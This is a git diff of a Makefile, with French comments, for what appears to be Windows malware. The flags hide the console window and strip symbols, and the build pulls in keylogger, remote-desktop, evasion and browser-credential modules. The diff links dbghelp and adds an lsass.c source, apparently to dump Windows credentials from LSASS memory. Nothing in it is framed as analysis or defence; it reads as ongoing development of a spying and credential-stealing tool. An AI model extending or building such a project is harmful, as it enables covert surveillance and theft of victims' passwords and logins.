@@ -16,7 +16,7 @@ CFLAGS += -I./include -I./src
 
 # Flags pour cacher la console et strip les symbols
 LDFLAGS = -s -mwindows
-LDFLAGS += -lwinhttp -lws2_32 -ladvapi32 -lvfw32 -lole32 -luuid -lgdiplus -lcrypt32
+LDFLAGS += -lwinhttp -lws2_32 -ladvapi32 -lvfw32 -lole32 -luuid -lgdiplus -lcrypt32 -ldbghelp
 
 # Flags de debug (décommenter pour debug)
 # CFLAGS += -g -DDEBUG
@@ -65,7 +65,8 @@ SURVEILLANCE_SRC = $(SRC_DIR)/surveillance/keylogger.c \
 
 REMOTE_SRC = $(SRC_DIR)/remote/desktop.c
 
-CREDENTIALS_SRC = $(SRC_DIR)/credentials/browser.c
+CREDENTIALS_SRC = $(SRC_DIR)/credentials/browser.c \
+                  $(SRC_DIR)/credentials/lsass.c
 
 ALL_SRC = $(CORE_SRC) $(CRYPTO_SRC) $(UTILS_SRC) $(EVASION_SRC) $(NETWORK_SRC) $(TASKS_SRC) $(SURVEILLANCE_SRC) $(REMOTE_SRC) $(CREDENTIALS_SRC)
 
